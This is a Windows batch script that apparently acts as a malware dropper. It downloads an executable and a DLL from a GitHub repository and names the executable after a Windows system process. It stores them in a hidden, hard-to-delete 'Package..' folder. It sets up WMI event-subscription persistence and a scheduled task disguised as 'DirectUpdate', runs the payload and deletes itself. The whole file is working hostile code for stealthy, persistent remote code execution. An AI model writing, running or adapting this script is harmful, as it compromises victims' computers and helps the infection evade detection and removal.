@echo off
schtasks /Delete /TN "\DirectUpdate" /F
schtasks /Delete /TN "\UpdateDirect" /F
taskkill /f /IM WmiPrv.exe /t
attrib -h -s -r C:\ProgramData\Packag /d /s
rd \\.\C:\ProgramData\Package..\ /S /Q
rd C:\ProgramData\Packag /S /Q 
wmic/namespace:\\root\subscription PATH CommandLineEventConsumer WHERE Name="pers" DELETE & wmic/namespace:\\root\subscription PATH __EventFilter WHERE Name="pers" DELETE & wmic/namespace:\\root\subscription PATH __FilterToConsumerBinding WHERE Filter='__EventFilter.Name="pers"' DELETE
wmic/namespace:\\root\subscription PATH CommandLineEventConsumer WHERE Name="per" DELETE & wmic/namespace:\\root\subscription PATH __EventFilter WHERE Name="per" DELETE & wmic/namespace:\\root\subscription PATH __FilterToConsumerBinding WHERE Filter='__EventFilter.Name="per"' DELETE
mkdir C:\ProgramData\Packag
mkdir \\.\C:\ProgramData\Package..\
powershell.exe iwr -Uri https://github.com/wazgame/waz/raw/main/DirectUpdate.xml -OutFile C:\ProgramData\DirectUpdate.xml
powershell.exe iwr -Uri https://github.com/wazgame/waz/raw/main/DirectUpdate.xml -OutFile C:\ProgramData\UpdateDirect.xml
wmic /NAMESPACE:"\\root\subscription" PATH __EventFilter CREATE Name="pers", EventNameSpace="root\cimv2",QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 300 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
wmic /NAMESPACE:"\\root\subscription" PATH CommandLineEventConsumer CREATE Name="pers", CommandLineTemplate="C:\ProgramData\Package..\WmiPrv.exe C:\ProgramData\Package..\utshellext.dll", CommandLineTemplate="C:\ProgramData\Package..\WmiPrv.exe C:\ProgramData\Package..\utshellext.dll"
wmic /NAMESPACE:"\\root\subscription" PATH __FilterToConsumerBinding CREATE Filter="__EventFilter.Name="pers"", Consumer="CommandLineEventConsumer.Name="pers""
wmic /NAMESPACE:"\\root\subscription" PATH __EventFilter CREATE Name="per", EventNameSpace="root\cimv2",QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 660 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
wmic /NAMESPACE:"\\root\subscription" PATH CommandLineEventConsumer CREATE Name="per", CommandLineTemplate="C:\ProgramData\Packag\WmiPrv.exe C:\ProgramData\Packag\utshellext.dll", CommandLineTemplate="C:\ProgramData\Packag\WmiPrv.exe C:\ProgramData\Packag\utshellext.dll"
wmic /NAMESPACE:"\\root\subscription" PATH __FilterToConsumerBinding CREATE Filter="__EventFilter.Name="per"", Consumer="CommandLineEventConsumer.Name="per""
schtasks /create /xml "C:\ProgramData\DirectUpdate.xml" /tn "\DirectUpdate"
powershell.exe iwr -Uri https://github.com/wazgame/waz/raw/main/WmiPrv.exe -OutFile C:\ProgramData\Packag\WmiPrv.exe
powershell.exe iwr -Uri https://github.com/wazgame/waz/raw/main/utshellext.dll -OutFile C:\ProgramData\Packag\utshellext.dll
copy C:\ProgramData\Packag\WmiPrv.exe \\.\C:\ProgramData\Package..\WmiPrv.exe
copy C:\ProgramData\Packag\utshellext.dll \\.\C:\ProgramData\Package..\utshellext.dll
attrib +h +s +r C:\ProgramData\Packag
del /S /Q C:\ProgramData\DirectUpdate.xml && del /S /Q C:\ProgramData\UpdateDirect.xml
C:\ProgramData\Packag\WmiPrv.exe C:\ProgramData\Packag\utshellext.dll
del/a/f "%~f0"